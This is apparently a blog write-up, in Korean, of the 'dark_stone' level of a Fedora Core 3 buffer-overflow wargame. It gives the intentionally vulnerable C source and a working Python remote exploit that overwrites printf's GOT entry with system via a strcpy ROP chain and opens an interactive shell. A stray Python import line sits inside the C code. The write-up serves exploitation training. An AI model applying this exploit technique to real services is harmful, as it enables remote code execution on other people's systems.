@@ -1,0 +1,159 @@
+---
+layout: post
+title:  "[FC3]Level5. dark_stone"
+subtitle:   "[FC3]evil_wizard → dark_stone"
+categories: Fedora_Catle_3
+tags:
+- Wargame
+- Fedora Catle 3
+- Write-up
+---
+
+## keyword : POP POP RET / Remote
+
+```c
+/*
+  The Lord of the BOF : The Fellowship of the BOF
+  - dark_stone
+  - Remote BOF on Fedora Core 3
+  - hint : GOT overwriting again
+  - port : TCP 8888
+*/
+#include <stdio.h>
+
+// magic potion for you
+from socket import *
+void pop_pop_ret(void)
+{
+  asm("pop %eax");
+  asm("pop %eax");
+  asm("ret");
+}
+
+int main()
+{
+  char buffer[256];
+  char saved_sfp[4];
+  int length;
+  char temp[1024];
+
+  printf("dark_stone : how fresh meat you are!\n");
+  printf("you : ");
+  fflush(stdout);
+
+  // give me a food
+  fgets(temp, 1024, stdin);
+
+  // for disturbance RET sleding
+  length = strlen(temp);
+
+  // save sfp
+  memcpy(saved_sfp, buffer+264, 4);
+
+  // overflow!!
+  strcpy(buffer, temp);
+
+  // restore sfp
+  memcpy(buffer+264, saved_sfp, 4);
+
+    // disturbance RET sleding
+    memset(buffer+length, 0, (int)0xff000000 - (int)(buffer+length));
+
+  // buffer cleaning
+  memset(0xf6ffe000, 0, 0xf7000000-0xf6ffe000);
+
+  printf("%s\n", buffer);
+}
+```
+
+hell_fire문제와 evil_wizard가 합쳐진 문제같다. 그런데 stdin임시 버퍼영역이 0으로 초기화된다.
+
+하지만 문제에서 stdin 임시버퍼 영역을 사용하지 않아도 될 것 같다.
+
+
+
+strcpy@plt : 0x08048438
+
+printf@plt : 0x08048408
+
+printf@got : 0x0804984c
+
+binsh : 0x833603
+
+system : 0x7507c0
+
+ppr : 0x80484f3
+
+
+
+```python
+from socket import *
+import struct
+
+def interactive(s):
+  while True:
+    cmd = raw_input("# ")
+    s.send(cmd + "\n")
+    print s.recv(4096),
+
+p32 = lambda x : struct.pack("<I", x)
+
+host = 'localhost'
+port = 8888
+
+strcpy_plt = 0x08048438
+ppr = 0x80484f3
+printf_plt = 0x08048408
+printf_got = 0x0804984c
+system_addr = [0x80484d0, 0x804817c, 0x80482b4, 0x8048138]
+binsh = 0x833603
+
+payload  = "A"*264  # dummy
+payload += "B"*4  # sfp
+
+for x in range(4):
+  payload += p32(strcpy_plt)
+  payload += p32(ppr)
+  payload += p32(printf_got+(x))
+  payload += p32(system_addr[x])
+
+payload += p32(printf_plt)
+payload += "C"*4
+payload += p32(binsh)
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect( (host, port) )
+s.sendall(payload + "\n")
+print s.recv(1024)
+
+interactive(s)
+```
+
+
+
+**dark_stone / let there be light**
+
+
+
+```sh
+                   ,.
+                 ,'  `.
+               ,' _<>_ `.
+             ,'.-'____`-.`.
+           ,'_.-''    ``-._`.
+         ,','      /\      `.`.
+       ,' /.._  O /  \ O  _.,\ `.
+     ,'/ /  \ ``-;.--.:-'' /  \ \`.
+   ,' : :    \  /\`.,'/\  /    : : `.
+  < <>| |   O >(< (  ) >)< O   | |<> >
+   `. : :    /  \/,'`.\/  \    ; ; ,'
+     `.\ \  /_..-:`--';-.._\  / /,'
+       `. \`'   O \  / O   `'/ ,'
+         `.`._     \/     _,','
+           `..``-.____.-'',,'
+             `.`-.____.-','
+               `.  <>  ,'
+                 `.  ,'
+                   `'
+```
+
